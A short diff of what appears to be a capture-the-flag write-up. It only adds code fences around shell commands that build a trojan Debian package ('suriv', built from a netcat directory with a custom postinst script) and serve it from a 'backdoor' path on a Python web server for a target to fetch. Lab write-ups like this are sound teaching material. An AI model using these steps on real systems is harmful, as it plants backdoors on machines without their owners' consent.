@@ -202,7 +202,9 @@ guest@3944f7bc1eff:~/debs$ chmod 775 netcat/DEBIAN/postinst
 guest@3944f7bc1eff:~/debs$ dpkg --build netcat
 dpkg-deb: building package 'suriv' in 'netcat.deb'.
 guest@3944f7bc1eff:~/debs$ mv netcat.deb suriv_amd64.deb
+```
 Rerunning the web server with a proper directory structure did the trick and I was able to establish the connection to the remote end, getting to know more the target file:
+```bash
 guest@3944f7bc1eff:~/debs$ mkdir -p ~/web/pub/jfrost/backdoor/
 guest@3944f7bc1eff:~/debs$ cp suriv_amd64.deb ~/web/pub/jfrost/backdoor/
 guest@3944f7bc1eff:~/web$ python3 -m http.server 80 2> /dev/null 1 > /dev/null &
